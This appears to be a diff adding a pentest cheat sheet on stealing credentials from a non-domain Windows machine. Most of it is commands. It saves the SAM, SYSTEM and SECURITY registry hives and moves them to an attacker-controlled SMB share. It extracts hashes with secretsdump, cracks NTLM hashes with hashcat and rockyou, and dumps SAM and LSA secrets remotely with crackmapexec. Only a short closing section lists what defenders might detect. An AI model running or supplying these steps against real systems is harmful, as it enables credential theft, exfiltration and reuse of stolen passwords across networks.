@@ -1,0 +1,123 @@
+🔐 What’s the Goal?
+Dump local password hashes from a non-domain Windows box
+
+Crack the hashes offline using Hashcat
+
+Optionally dump LSA secrets for creds in memory (services, tasks, etc.)
+
+🧠 Why This Matters
+Offline = stealthier and faster
+
+Common foothold technique if you get local admin
+
+Easy to automate and script
+
+NT hashes can be reused or cracked to reuse creds across systems
+
+🛠️ Step-by-Step
+🗃️ 1. Save Registry Hives
+You need:
+
+hklm\SAM → actual password hashes
+
+hklm\SYSTEM → the bootkey to decrypt the SAM
+
+hklm\SECURITY → (optional) cached domain creds
+
+Run in an elevated CMD on the target:
+
+cmd
+Copy
+Edit
+reg save hklm\sam C:\sam.save
+reg save hklm\system C:\system.save
+reg save hklm\security C:\security.save
+📦 2. Exfiltrate Hives
+Start an SMB share on your attacker box:
+
+bash
+Copy
+Edit
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/buck/samdump
+From the Windows target:
+
+cmd
+Copy
+Edit
+move C:\sam.save \\<your_IP>\CompData
+move C:\system.save \\<your_IP>\CompData
+move C:\security.save \\<your_IP>\CompData
+💣 3. Dump Hashes Offline
+On your attacker box:
+
+bash
+Copy
+Edit
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+You’ll get output like:
+
+ruby
+Copy
+Edit
+user:RID:LMHASH:NTHASH:::
+Most modern systems have LMHASH = aad3b435... → ignore it, crack the NTHASH
+
+🧨 4. Crack NT Hashes
+Create hashes.txt:
+
+bash
+Copy
+Edit
+vim hashes.txt
+Paste in only the NTHASH values.
+
+Then run:
+
+bash
+Copy
+Edit
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+-m 1000 = NTLM hashes
+
+rockyou.txt = standard password list
+
+Bonus: Combine this with mutated wordlists from earlier for better hits
+
+🛰️ Remote Attacks
+📌 Dump SAM Remotely (with creds):
+bash
+Copy
+Edit
+crackmapexec smb <target-ip> --local-auth -u <user> -p <pass> --sam
+📌 Dump LSA Secrets (remote memory creds):
+bash
+Copy
+Edit
+crackmapexec smb <target-ip> --local-auth -u <user> -p <pass> --lsa
+You might get:
+
+Stored service account passwords
+
+DPAPI secrets
+
+NL$KM key for offline cached logon cracking
+
+🔑 Quick Tips
+Situation	Tool	Notes
+Local admin access	reg save	Dump SAM/SYSTEM, exfil via SMB
+Offline hash cracking	secretsdump + hashcat	Fast + stealth
+Need in-memory creds	crackmapexec --lsa	Goldmine for services/tasks
+Want hashes over network	crackmapexec --sam	Easier than local exfil
+Crack offline	hashcat -m 1000	NTLM-only
+🚨 Detection Notes
+These actions = loud
+
+Expect blue teams to get alerts from:
+
+Registry hive dumping
+
+SMB exfil
+
+secretsdump behavior
+
+Reuse of cracked creds
